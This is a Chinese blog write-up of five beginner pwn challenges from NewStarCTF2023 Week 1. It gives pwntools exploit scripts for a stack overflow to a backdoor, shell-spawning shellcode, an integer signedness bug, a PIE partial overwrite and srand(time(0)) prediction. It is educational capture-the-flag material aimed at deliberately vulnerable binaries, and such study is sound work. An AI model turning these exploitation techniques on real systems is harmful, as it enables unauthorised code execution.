# NewStarCTF2023-Week1-Pwn


# ret2text

首先checksec

![image-20231003110256058](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110256058.png)

发现程序开启GOT完全只读和栈不可执行，但是没有开启随机化和Canary。

扔进ida64看下：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003110942529.png)

发现read处存在溢出（buff只有32字节但是读了256字节）。

同时发现后门函数backdoor：

![image-20231003111225107](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003111225107.png)

于是就是一道非常标准的ret2text，这里通过buf的溢出劫持RIP指向backdoor进行执行即可。

根据ida的显示，buf距离栈底20h的距离，64位程序栈单元是8字节，backdoor的后门地址是0x4011fb。同时，由于跳过了call的步骤直接跳转到backdoor地址执行，可能破坏原有的堆栈平衡，这里将backdoor的ret地址（0x40122D）在执行前丢进栈，保证堆栈平衡。

所以payload如下：

```python
from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

#r = process('./ret2text')
r = remote('node4.buuoj.cn',29883)

offset = 0x20
backdoor = 0x4011fb

payload =  b'a' * offset + b'b' * 8 + p64(0x40122D) + p64(backdoor)

r.sendafter('magic',payload)
r.interactive()

```

然后远程连接程序即可：

![image-20231003112352853](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003112352853.png)

# ezshellcode

首先checksec，发现开启了栈保护和部分RELRO

![image-20231004101724816](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101724816.png)

ida64，发现主要代码就如下所示：

![image-20231004101904309](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004101904309.png)

这里我们发现buf被存放在mmap申请（映射）的0x66660000的地址，并且后面直接用read读了256个字节。最后jumpout直接跳转到buf所在位置进行执行。

结合题目的意思，应该是只要将shellcode读入即可。

我们直接运行一下程序，也证明了我的猜测：

![image-20231004102205235](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004102205235.png)

下面只要找任意一个小于256字节的shellcode传入即可。

这里直接使用pwntool自带的shellcraft。

```python
from pwn import *

context(arch='amd64',os='linux')
r = process("./ezshellcode")

payload = asm(shellcraft.sh())

#r.recvuntil(b'magic\n')

r.sendafter(b'magic\n',payload)

r.interactive()

```

注意这里一定要将\n读入，否则进入shell就会直接退出。

# newstar shop

首先checksec，发现保护全开

![image-20231004110416116](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004110416116.png)

先用ida打开一下：

![image-20231004111654367](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004111654367.png)

发现应该是一个互动的程序。依次查看三个函数：

shop

```c
unsigned __int64 shop()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("=============================");
  puts("===Welcome to newstar shop===");
  puts("=============================");
  puts("1.newstar's gift          20$");
  puts("2.pwn write up            40$");
  puts("3.shell                 9999$");
  puts("\n");
  puts("All things are only available for one day!");
  puts("What do you want to buy?");
  puts("\n");
  if ( (int)__isoc99_scanf("%d", &v1) <= 0 )
    puts("Invalid input");
  if ( v1 != 3 )
  {
    if ( v1 > 3 )
    {
LABEL_17:
      puts("nothing here");
      puts("\n");
      return v2 - __readfsqword(40u);
    }
    if ( v1 == 1 )
    {
      if ( (unsigned int)money > 19 )
      {
        money -= 20;
        puts("You buy a newstar's gift");
        puts("That is the gift:");
        puts("What will happen when int transfer to unsigned int?");
        goto LABEL_10;
      }
    }
    else
    {
      if ( v1 != 2 )
        goto LABEL_17;
      if ( (unsigned int)money > 39 )
      {
        money -= 40;
        puts("You buy a pwn write up");
        puts("That is free after the match,haha");
        goto LABEL_10;
      }
    }
    puts("Sorry,you don't have enough money");
LABEL_10:
    puts("\n");
    return v2 - __readfsqword(40u);
  }
  if ( (unsigned int)money > 9998 )
  {
    money = 0;
    puts("How do you buy it?");
    puts("\n");
    system("/bin/sh");
  }
  else
  {
    puts("Sorry,you don't have enough money");
    puts("\n");
  }
  return v2 - __readfsqword(40u);
}
```

这里发现，总共可以用money购买三种商品，我们感兴趣的肯定就是shell。也就是说，只要能买第三项就可以直接getshell。我们肯定不回去赚9999的（当然似乎也可以）。

这里有个很重要的发现，在第一个gift处提示：**What will happen when int transfer to unsigned int?**。我们发现每次检查金额的时候，都会将int类型的money强制转化为unsigned int。这里直接想到整数溢出，也就是将money变为负的即可。但是仅凭shop只能将money变为0。我们需要再找一个“扣钱”的步骤。

于是在main函数中，我们发现了一个dont_cry函数：

![image-20231004112333104](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112333104.png)

发现，这里可以无条件的将money扣除50，但是有且仅有一次机会。这足够了。

首先我们确定money初始值是100（64h），那么我们在shop购买两次writeup然后直接dont_cry就可以溢出了。

连接靶机，依次输入：

```
1
2
1
2
3
1
3
ls
cat flag
```

即可拿到flag

![image-20231004112812375](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231004112812375.png)

# p1eee

应该是绕过pie保护，其实是pie并不会将地址的低12位（也就是1.5个字节随机化）

根据题目，发现后门函数和实际ret的值只差了最后一个字节（改为\x69即可）

exp如下，（其实直接输入0x28个a加上一个i就可以getshell，因为最后\x69是可见字符i）

```python
from pwn import *

context(arch='amd64',os='linux',log_level='debug')

r = process('./pwn')

r.recvuntil(b'pie!!!\n')

r.send(b'a' * 0x28 + b'\x69')

r.interactive()
```

# random

通过ctype库加载libc.so库，使用同样的time(0)达到产生同样随机数的效果，然后system($0)同样可以getshell

```
from pwn import *
from LibcSearcher import *
from ctypes import *

file_name = './random'

debug = 0
if debug:
	io = remote('node4.buuoj.cn',26238)
else:
	io = process(file_name)

elf = ELF(file_name)

context(arch = elf.arch,log_level = 'debug',os = 'linux')

def dbg():
	gdb.attach(io)

libc = cdll.LoadLibrary('libc.so.6')

libc.srand(libc.time(0))
a = libc.random()

io.sendlineafter('number?\n',str(a))

io.interactive()
```



---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/  

